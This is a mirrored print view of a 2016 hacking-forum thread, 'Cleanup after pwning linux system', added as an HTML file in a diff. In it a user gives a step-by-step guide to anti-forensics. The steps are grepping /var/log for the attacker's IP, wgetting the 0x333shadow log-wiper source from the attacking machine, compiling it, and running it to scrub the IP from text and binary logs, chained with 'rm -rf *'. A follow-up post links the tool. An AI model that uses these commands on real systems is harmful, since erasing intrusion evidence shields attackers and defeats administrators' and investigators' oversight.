@@ -1,0 +1,161 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=6901&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:22:25 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+	<base  /><!--[if IE]></base><![endif]-->
+	<meta name="generator" content="vBulletin 4.2.1" />
+
+	
+	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	
+
+
+
+	<title> Cleanup  after pwning linux system</title>
+	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+<body>
+
+<div class="above_body">
+<div id="header" class="floatcontainer">
+<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+</div>
+</div>
+<div class="body_wrapper">
+<div id="pagetitle">
+	<h1><a href="showthreadc6e4.html?t=6901">Cleanup  after pwning linux system</a></h1>
+	<p class="description">Printable View</p>
+</div>
+
+
+
+<ul id="postlist">
+	<li class="postbit blockbody" id="post_1">
+	<div class="header">
+		<div class="datetime">08-18-2016, 07:24 PM</div>
+		<span class="username">mayank7651</span>
+	</div>
+	
+	
+		<div class="title">Cleanup  after pwning linux system</div>
+	
+	<div class="content">
+		<blockquote class="restore">I thought of making a thread for covering ****** in linux, this is going to be my first thread so hang on for a while  :D <br />
+<br />
+So as we all know about where is all the logs located in Linux which is /var/log , now we are going to clean our track after pwning any system.<br />
+<br />
+So the simplest way is to see what are all the traces you are leaving behind via the below command, 192.168.0.101 is the attacking ip:<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">cd /var/log &amp;&amp; grep -r 192.168.0.101 ./</code><hr />
+</div>the output will look like below which is a very small part of the output, so you can get a hint what you are leaving behind.  <br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">./httpd/access_log:192.168.0.101 - - [18/Aug/2016:07:24:05 -0400] &quot;GET / HTTP/1.0&quot; 200 2890 &quot;-&quot; &quot;-&quot;<br />
+./httpd/access_log:192.168.0.101 - - [18/Aug/2016:07:24:11 -0400] &quot;GET / HTTP/1.0&quot; 200 2890<br />
+./httpd/access_log:192.168.0.101 - - [18/Aug/2016:07:24:14 -0400] &quot;PROPFIND / HTTP/1.1&quot; 405 310 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;cd /var/log &amp;&amp; grep -r 192.168.0.101 ./<br />
+<br />
+./httpd/access_log:192.168.0.101 - - [18/Aug/2016:07:24:14 -0400] &quot;GET /nmaplowercheck1471519336 HTTP/1.1&quot; 404 296 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;<br />
+./httpd/access_log:192.168.0.101 - - [18/Aug/2016:07:24:14 -0400] &quot;GET / HTTP/1.1&quot; 200 2890 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</code><hr />
+</div>So here we are going to use the &quot;<b>0x333shadow</b>&quot; , below is a small introduction about 0x333shadow:<br />
+<br />
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br />
+0x333shadow is a tool, that allow you hide your track in a system, it's clean default dirs with a recursive scan<br />
+including subdirectory.<br />
+Clean all text files, automatic skip ELF or other binary file... clean only &quot;known&quot; binary logs as utmp, utmpx, wtmp,<br />
+wtmpx, lastlog.<br />
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br />
+<br />
+The good thing about this is that it removes your IP from different logs locations. <br />
+<br />
+now just wget your  0x333shadow file from the apache server started on 192.168.0.101(attacking ip)<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">wget 192.168.0.101/0x333shadow.c</code><hr />
+</div>get the file copiled via below commands,depending on the OS flavour you are using:<br />
+<br />
+Linux:     gcc          0x333shadow.c -o 0x333shadow -D Linux<br />
+IRIX:      cc           0x333shadow.c -o 0x333shadow -D IRIX<br />
+FreeBSD:   gcc          0x333shadow.c -o 0x333shadow -D FreeBSD<br />
+SunOS:     cc/gcc       0x333shadow.c -o 0x333shadow -D SunOS -lsocket<br />
+<br />
+So we are going to use the first one which is linux.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">gcc&nbsp; 0x333shadow.c -o 0x333shadow -D Linux</code><hr />
+</div>Use the below command to run cleanup:<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">./0x333shadow -a -i 192.168.0.101 -l 5 &amp;&amp; rm -rf *</code><hr />
+</div>Thisremoves traces of the attackers IP in all default log directories, binary files (utmp, wtmp, utmpx, wtmpx, lastlog) as well as scanning “syslog” and “newsyslog” to try and detect other log locations. <br />
+As mentioned in the above &quot;-l 5&quot; , which means 0x333shadow will run after 5 secs, which will allow 0x333shadow  to remove all traces of the program itself.<br />
+<br />
+<br />
+Its worth seeing the help menu of the program via <div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">./0x333shadow</code><hr />
+</div> .<br />
+<br />
+Some Notes:<br />
+<br />
+- There may be the case when attacker might be logged by any other service(any third party) which is not worked up by the 0x333shadow .<br />
+- And of course forensic guys can recover the logs from the hard disk :p <br />
+<br />
+Have fun.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_2">
+	<div class="header">
+		<div class="datetime">08-18-2016, 07:26 PM</div>
+		<span class="username">mayank7651</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">forgot to give the link to the program ;) below it is:<br />
+<br />
+<a href="../dl.packetstormsecurity.net/UNIX/penetration/log-wipers/0x333shadow.tar.gz" target="_blank">http://dl.packetstormsecurity.net/UN...3shadow.tar.gz</a></blockquote>
+	</div>
+</li>
+</ul>
+
+
+</div>
+<div class="below_body">
+<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:04 PM</span>.</div>
+
+<div id="footer_copyright" class="footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+</div>
+ 
+</div>
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=6901&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:22:25 GMT -->
+</html>
